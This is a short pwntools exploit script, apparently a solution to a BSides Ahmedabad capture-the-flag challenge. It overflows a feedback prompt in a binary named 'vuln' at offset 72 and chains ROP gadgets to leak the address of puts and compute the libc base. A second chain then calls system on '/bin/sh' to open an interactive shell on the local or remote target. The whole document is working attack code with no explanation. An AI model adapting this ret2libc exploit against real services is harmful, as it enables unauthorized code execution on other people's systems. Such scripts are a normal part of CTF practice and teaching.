#!/usr/bin/env python3
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        context.terminal = ["/mnt/c/wsl-terminal/open-wsl.exe", "-e"]
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote('pwn2.bsidesahmedabad.in', 9001, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


exe = './vuln'
elf = context.binary = ELF(exe, checksec=False)
libc = ELF('./libc-2.31.so')
context.log_level = 'info'

offset = 72
pop_rdi = 0x401273
ret = 0x40101a

io = start()
payload = flat({
    offset: [
        pop_rdi,
        elf.got.puts,
        elf.plt.puts,
        elf.sym.main,
    ]
})

io.sendlineafter(b'Enter your feedback: \n', payload)
io.recvuntil(b'Thank you!\n')
libc.address = u64(io.recvline()[:6].ljust(8, b"\x00")) - libc.sym.puts

log.info("libc base = %#x", libc.address)

system = libc.address + 0x55410
binsh = libc.address + 0x1b75aa
payload = flat({
    offset: [
        pop_rdi,
        binsh,
        ret,
        system,
    ]
})
io.sendlineafter(b'Enter your feedback: \n', payload)
io.interactive()